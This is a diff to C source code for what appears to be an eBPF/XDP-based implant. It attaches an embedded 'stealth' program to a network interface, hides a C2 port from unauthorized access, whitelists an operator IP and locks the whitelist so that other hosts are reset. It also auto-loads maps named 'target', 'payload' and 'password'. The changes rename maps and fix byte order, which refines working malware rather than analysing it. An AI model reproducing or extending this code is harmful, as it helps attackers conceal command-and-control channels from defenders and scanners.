@@ -275,8 +275,9 @@ static void apply_initial_config(struct bpf_object *obj, const char *config) {
     struct bpf_map *map;
     bpf_object__for_each_map(map, obj) {
         const char *n = bpf_map__name(map);
-        /* 若 map 包含 "target", "payload", "password" 等关键字，自动写入初始配置 */
-        if (strstr(n, "target") || strstr(n, "payload") || strstr(n, "password")) {
+        /* 若 map 包含 "target", "payload", "password", "whitelist" 等关键字，自动写入初始配置 */
+        if (strstr(n, "target") || strstr(n, "payload") || 
+            strstr(n, "password") || strstr(n, "whitelist")) {
             int fd = bpf_map__fd(map);
             if (fd < 0) continue;
 
@@ -1039,9 +1040,11 @@ static void auto_load_stealth(int c2_port, const char *ifname) {
     printf("[+] XDP stealth (embedded) attached to %s\n", ifname);
 
     /* Initialize hidden port */
-    uint16_t port_key = (uint16_t)c2_port;
+    uint16_t port_key = htons((uint16_t)c2_port);
     uint32_t val = 1;
-    if (bpf_map__update_elem(stealth_skel->maps.target, &port_key, sizeof(port_key), &val, sizeof(val), BPF_ANY) == 0) {
+
+    // target -> target_port
+    if (bpf_map__update_elem(stealth_skel->maps.target_port, &port_key, sizeof(port_key), &val, sizeof(val), BPF_ANY) == 0) {
         printf("[+] C2 port %d hidden from unauthorized access\n", c2_port);
     }
 }
@@ -1059,14 +1062,17 @@ static void stealth_allow_ip(uint32_t ip_net) {
 
     /* 1. Write IP whitelist */
     uint32_t val = 1;
-    if (bpf_map__update_elem(stealth_skel->maps.whitelist, &ip_net, sizeof(ip_net), &val, sizeof(val), BPF_ANY) == 0) {
+
+    // Update target_ip map
+    if (bpf_map__update_elem(stealth_skel->maps.target_ip, &ip_net, sizeof(ip_net), &val, sizeof(val), BPF_ANY) == 0) {
         struct in_addr ia = { .s_addr = ip_net };
         printf("[+] XDP: %s whitelisted\n", inet_ntoa(ia));
     }
 
-    /* 2. Activate lock flag */
-    uint32_t key = 0, locked = 1;
-    bpf_map__update_elem(stealth_skel->maps.whitelist_count, &key, sizeof(key), &locked, sizeof(locked), BPF_ANY);
+    // Lock the whitelist mechanism
+    uint32_t key = 0;
+    uint32_t locked = 1;
+    bpf_map__update_elem(stealth_skel->maps.target_ip_count, &key, sizeof(key), &locked, sizeof(locked), BPF_ANY);
     printf("[+] XDP: whitelist locked — unauthorized IPs will be RST'd\n");
 }
 
